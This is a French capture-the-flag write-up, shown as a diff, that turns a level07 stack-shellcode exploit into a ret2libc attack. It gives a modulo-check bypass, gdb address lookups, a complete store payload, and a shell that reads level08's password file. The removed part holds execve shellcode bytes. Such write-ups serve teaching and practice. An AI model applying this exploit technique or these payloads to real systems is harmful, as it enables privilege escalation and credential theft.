@@ -41,28 +41,34 @@ Aucune vérification de taille sur l'index. On peut donc écrire 4 octets n'impo
 
 Comme `data` est sur la stack, on peut écrire au-delà du tableau, jusqu'à la saved adresse de retour de main. `read` sert à sonder la mémoire pour valider les offsets.
 
-Le plan :
-1. écrire notre shellcode dans le buffer data (index 0, 1, 2...)
-2. écraser l'adresse de retour de main par l'adresse du buffer
-3. quand main fait `ret` (au quit), il saute sur notre shellcode -> shell level08
-
 ### Deux garde-fous
 
 - `uVar2 % 3 == 0` : l'index saisi ne doit pas être multiple de 3.
-- `uVar1 >> 0x18 == 0xb7` : l'octet de poids fort de la valeur ne doit pas valoir 0xb7 (ca bloque les adresses 0xb7..., typiquement la libc).
+- `uVar1 >> 0x18 == 0xb7` : l'octet de poids fort de la valeur ne doit pas valoir 0xb7. Ce check est censé bloquer les adresses de la libc (typiquement 0xb7... sur ces cibles). On verra plus bas que sur ma VM la libc est ailleurs (0xf7...), donc ce garde-fou tombe à l'eau et c'est exactement ce qui rend le ret2libc possible.
 
-### Point clé : l'environnement est effacé
+### Le plan : ret to libc
 
-Dans un autre level, on mettait le shellcode dans une variable d'env. Ici on ne peut pas, car au début de main, deux boucles memset zéro-remplissent argv ET envp.
+Pas de shellcode. Au lieu d'injecter du code, on réutilise `system()` qui est déjà dans la libc. On écrase la saved EIP de main avec l'adresse de `system`, et on prépare sa pile pour qu'il exécute `system("/bin/sh")`.
+
+Pourquoi ret2libc plutôt que shellcode-sur-pile : le shellcode oblige à écrire l'adresse absolue du buffer dans la saved EIP, et cette adresse bouge selon la taille de l'environnement -> ca marche sur une VM, pas sur une autre. Le ret2libc lui n'a AUCUNE adresse de pile en dur : on ne manipule que des adresses de la libc. Donc plus de dépendance à l'env.
+
+Le layout qu'on écrit à partir de la saved EIP :
 
 ```
-for (; *local_1c4 != 0; ...) memset((void *)*local_1c4, 0, ...);  // efface argv
-for (; *local_1c8 != 0; ...) memset((void *)*local_1c8, 0, ...);  // efface envp
+data[114] = &system      saved EIP -> system s'exécute au ret de main
+data[115] = &exit        adresse de retour de system (sortie propre)
+data[116] = &"/bin/sh"   argument de system
 ```
 
-Conséquence : le shellcode ne peut pas être dans l'env, il serait effacé. On le met donc DANS le buffer data lui-même, via des store successifs.
+Mécanique : quand main fait `ret` (au `quit`), il dépile `data[114]` dans EIP -> c'est `system`. Juste après ce dépilement, `esp` pointe sur `data[115]`. `system` lit alors son adresse de retour en `[esp]` (= `exit`) et son premier argument en `[esp+4]` (= `"/bin/sh"`). Donc `system("/bin/sh")` -> shell level08. Quand on quitte le shell, `system` retourne sur `exit` -> ca se termine proprement au lieu de crasher.
 
-### Contournement du check % 3
+### Pourquoi ca passe le garde-fou 0xb7
+
+Le check refuse les valeurs dont l'octet de poids fort vaut 0xb7. C'est un anti-ret2libc : sur les vieilles cibles la libc est en 0xb7xxxxxx, donc `&system` serait bloqué.
+
+Sauf que sur ma VM la libc est mappée en **0xf7xxxxxx**. `system`, `exit` et la chaîne `/bin/sh` commencent donc tous par 0xf7, pas 0xb7 -> le filtre ne les voit pas. Le garde-fou vise la mauvaise plage. C'est à vérifier au cas par cas (voir plus bas `p/x (int)system`) : si ca sort du 0xb7 chez toi, le ret2libc est mort et il faut repasser au shellcode.
+
+### Contournement du check %3
 
 Le programme fait deux choses avec l'index :
 - il check `index % 3 == 0` (et refuse si c'est le cas)
@@ -74,135 +80,121 @@ L'index est un uint 32 bits. Si on ajoute 0x40000000 à l'index :
 ```
 0x40000000 * 4 = 0x100000000
 ```
-0x100000000 ne rentre pas dans 32 bits -> il déborde et le bit en trop est jeté ->
-il reste 0. Donc ajouter 0x40000000 à l'index NE CHANGE PAS l'offset final (index*4).
+0x100000000 ne rentre pas dans 32 bits -> il déborde et le bit en trop est jeté -> il reste 0. Donc ajouter 0x40000000 à l'index NE CHANGE PAS l'offset final (index*4).
 
 Par contre pour le check `% 3`, ca change tout car :
 ```
 0x40000000 % 3 = 1
 ```
-Donc saisir `index + N*0x40000000` :
-- garde le même offset d'écriture (grace au débordement du *4)
-- mais décale le modulo de +N : le check voit `(index + N) % 3` au lieu de `index % 3`
+Donc saisir `index + 0x40000000` garde le même offset d'écriture mais décale le modulo de +1 : le check voit `(index + 1) % 3` au lieu de `index % 3`.
 
-Il suffit de choisir N dans {0, 1, 2} pour que `(index + N) % 3 != 0`.
-
-Petit piège dans lequel je suis tombé :
-au début j'ajoutais 0x40000000 A TOUS les index (N=1 partout). Mais comme 0x40000000 % 3 = 1, ca transforme les index "reel % 3 == 2" en multiples de 3. Donc Un index sur trois échouait avec "reserved for wil".
-
-La bonne méthode : N dépend de l'index. On ajout 0x40000000 seulement sur les modulo de 3.
+Ici on n'a que 3 index à écrire (114, 115, 116) :
 ```
-index reel 0  (0%3=0, bloqué) -> N=1 -> saisir 0 + 0x40000000 = 1073741824  (%3=1, OK)
-index reel 1  (1%3=1, OK)     -> N=0 -> saisir 1                             (%3=1, OK)
-index reel 2  (2%3=2, OK)     -> N=0 -> saisir 2                             (%3=2, OK)
-index reel 3  (3%3=0, bloqué) -> N=1 -> saisir 3 + 0x40000000 = 1073741827  (%3=1, OK)
-...
+index 114  (114%3=0, bloqué) -> +0x40000000 -> saisir 1073741938  (%3=1, OK)
+index 115  (115%3=1, OK)     -> saisir 115 tel quel
+index 116  (116%3=2, OK)     -> saisir 116 tel quel
 ```
-En clair : si l'index réel n'est pas multiple de 3, on le saisit tel quel. S'il l'est, on ajoute 0x40000000 pour esquiver le check.
-
-### Le shellcode
-
-execve /bin/sh (21 octets) avec un sled de NOP devant. Le sled sert à absorber l'imprécision sur l'adresse du buffer (même logique qu'au level05) : on vise dans le tapis de NOP, le CPU glisse jusqu'au vrai shellcode.
-
-```
-sled : 160 octets de \x90 (NOP)
-code : \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
-```
-
-### Transformer le shellcode en commandes store
-
-`store` écrit 4 octets à la fois, sous forme d'un nombre décimal (scanf %u).
-Il faut donc découper le shellcode en blocs de 4 octets, et convertir chaque bloc en son entier little-endian (octets à l'envers).
-
-Exemple 1 - un bloc de NOP : octets `90 90 90 90`
-```
-little-endian -> 0x90909090 -> en décimal : 2425393296
-```
--> commande :
-```
-store
-2425393296
-<index>
-```
-
-Exemple 2 - début du vrai shellcode : octets `6a 0b 58 99`
-```
-octets lus a l'envers (little-endian) = 0x99 0x58 0x0b 0x6a = 0x99580b6a
-0x99580b6a en décimal = 2572684138
-```
--> commande :
-```
-store
-2572684138
-<index>
-```
-
-On répète pour tous les blocs (index 0, 1, 2, ...), en appliquant le contournement %3 sur l'index à chaque fois. On termine par la ligne qui écrase l'adresse de retour, puis `quit`.
-
-Toutes les entrées sont dans le fichier cmd_level07.txt
-
+En clair : seul 114 est multiple de 3, c'est le seul qu'on doit maquiller.
 
 ### Trouver l'index de la saved EIP
 
-Ce qu'on cherche : la saved EIP, c'est l'adresse de retour de main, celle vers laquelle le CPU saute quand main fait `ret` (donc quand on tape quit). Si on arrive à écrire dessus, `quit` ne quittera plus : il sautera où on veut. Reste à savoir à quel index elle se trouve par rapport au début du buffer.
+Ce qu'on cherche : la saved EIP, c'est l'adresse de retour de main, celle vers laquelle le CPU saute quand main fait `ret` (donc quand on tape quit). Reste à savoir à quel index elle se trouve par rapport au début du buffer.
 
 On sait écrire à `data + index*4` donc :
 ```
 index = (adresse_saved_EIP - data) / 4
 ```
 
-Il faut ces deux adresses. On les déduit du prologue de main `disas main` :
+On déduit une estimation du prologue de main (`disas main`) : frame de 0x1d0 (464) octets, `data` à esp+0x24 (36), plus les registres sauvés et l'alignement `and $0xfffffff0` -> ~114. Mais l'alignement retire un nombre d'octets variable selon l'env, donc 114 est une estimation à confirmer.
+
+Confirmation par sondage. On écrit une valeur reconnaissable (45) à l'index candidat, on la relit avec `read` pour vérifier qu'on tape bien là, puis on quitte :
 
 ```
-+6   push %ebp
-+3.. push %edi / %esi / %ebx  ->  4 registres poussés au total avec ebp
-+9   and  $0xfffffff0,%esp    ->  alignement 16 -> retire un nb variable d'octets
-+9   sub  $0x1d0,%esp         ->  réserve 0x1d0 = 464 octets de frame
-...
-+448 lea  0x24(%esp),%eax     ->  data = esp + 0x24  (36)  -> passé à store_number
-```
-
-- `data` est à esp + 0x24, soit 36 octets au-dessus du bas de la frame.
-- La saved EIP est tout en haut de la frame, au-dessus des registres sauvés.
-
-Estimation de la distance :
-```
-(taille_frame - offset_buffer + registres_poussés + alignement) / 4
-(   464          -     36     +      16           +   12      ) / 4 = 114
-```
-
-Mais le and $0xfffffff0 retire un nombre d'octets qui dépend de la valeur d'esp au lancement, donc de l'environnement. Le "12" est une supposition. Autrement dit, 114 est une estimation, pas une certitude, il faut la vérifier.
-
-### Confirmer l'index par sondage
-Plutôt que de faire confiance au calcul, on teste. La commande `read` sert exactement à ça : sonder la mémoire. Et le comportement au quit nous dit si on a touché la saved EIP.
-
-Test : on écrit une valeur reconnaissable (45) à l'index candidat, on la relit pour vérifier qu'on écrit bien là où on croit, puis on quitte.
-
-```
-./level07
 Input command: store
  Number: 45
- Index: 1073741938 // = 0x40000000 + 114
+ Index: 1073741938        // = 0x40000000 + 114 (esquive le %3)
  Completed store command successfully
 Input command: read
  Index: 114
- Number at data[114] is 45 // on relit bien 45 -> l'index vise la bonne case
+ Number at data[114] is 45   // on relit bien 45 -> l'index vise la bonne case
 Input command: quit
 Segmentation fault (core dumped)
 ```
 
-Le segfault au quit est la preuve recherchée : le ret de main a sauté sur 45 (une adresse invalide) au lieu de retourner normalement. Donc l'index 114 tombe bien sur la saved EIP. L'estimation était correct, et elle est maintenant confirmée.
+Le segfault au quit est la preuve : le `ret` de main a sauté sur 45 (adresse invalide) au lieu de retourner normalement. Donc l'index 114 tombe bien sur la saved EIP. Si le programme s'était terminé proprement, 114 ne visait pas la saved EIP -> on aurait balayé les voisins (113, 115, 116...) jusqu'au segfault.
 
-Si au lieu du segfault le programme s'était terminé proprement, ça aurait voulu dire que 114 ne visait pas la saved EIP -> on aurait balayé les index voisins (113, 115, 116…) jusqu'à obtenir le segfault.
+À partir de là, il suffit de remplacer 45 par `&system` : le `ret` sautera dans system au lieu de crasher.
 
-À partir de là, il suffit de remplacer 45 par l'adresse de notre buffer : le ret sautera sur le shellcode au lieu de crasher.
+### Trouver system, exit et /bin/sh
+
+Tout se récupère dans gdb. On casse sur main pour que la libc soit déjà mappée :
+
+```
+gdb ./level07
+(gdb) break main
+(gdb) run
+
+(gdb) p/x (int)system
+$1 = 0xf7e6aed0
+
+(gdb) p/x (int)exit
+$2 = 0xf7e5eb70
+
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+```
+
+- `p/x (int)system` / `p/x (int)exit` : adresses des deux fonctions. Au passage on vérifie qu'elles commencent bien par 0xf7 (et pas 0xb7) -> le filtre les laisse passer.
+- `find &system, +9999999, "/bin/sh"` : cherche la chaîne littérale `/bin/sh` dans la libc à partir de system. Le résultat est **la première ligne** (`0xf7f897ec`). Attention piège : le `0xf7fd3b74` du warning n'est PAS un résultat, c'est juste l'endroit où gdb a buté sur de la mémoire illisible et stoppé la recherche.
+
+On peut confirmer la chaîne :
+```
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:     "/bin/sh"
+```
+
+### Convertir en décimal pour store
+
+`store` lit la valeur avec `scanf %u` -> il faut donner chaque adresse en décimal (pas en hexa) :
+
+```
+python3 -c 'print(0xf7e6aed0)'   # system  -> 4159090384
+python3 -c 'print(0xf7e5eb70)'   # exit    -> 4159040368
+python3 -c 'print(0xf7f897ec)'   # /bin/sh -> 4160264172
+```
+
+### Le payload
+
+```
+store
+4159090384
+1073741938
+store
+4159040368
+115
+store
+4160264172
+116
+quit
+```
+
+Décodage ligne par ligne :
+
+```
+data[114] = 4159090384  (0xf7e6aed0 system)    index saisi 1073741938  (114 +0x40000000, esquive %3)
+data[115] = 4159040368  (0xf7e5eb70 exit)      index saisi 115         (115%3=1, OK)
+data[116] = 4160264172  (0xf7f897ec "/bin/sh") index saisi 116         (116%3=2, OK)
+quit -> ret de main -> system("/bin/sh")
+```
 
 ### Injection finale
 
 Le `-` après le fichier est ESSENTIEL : il garde stdin ouvert après le fichier. Sinon le shell obtenu reçoit tout de suite EOF et meurt sans qu'on puisse taper.
 
 ```
-cat cmd_level07.txt - | ./level07
+cat payload.txt - | ./level07
 ...
 Input command:  Number:  Index:  Completed store command successfully
 whoami
@@ -210,3 +202,14 @@ level08
 cat /home/users/level08/.pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 ```
+
+### Piège : ASLR
+
+gdb désactive l'ASLR par défaut. Donc les adresses vues dans gdb (0xf7e6aed0...) ne sont valides en exécution réelle QUE si l'ASLR est aussi désactivé hors gdb. À vérifier :
+
+```
+cat /proc/sys/kernel/randomize_va_space
+```
+
+- `0` -> ASLR off. Les adresses gdb = adresses réelles. Le ret2libc est déterministe et robuste à l'env. C'est le cas ici.
+- `2` -> ASLR on. La libc bouge à chaque run, les adresses gdb sont un leurre, ces valeurs ne tiendront pas -> il faudrait un leak, ou repasser au shellcode-sur-pile.
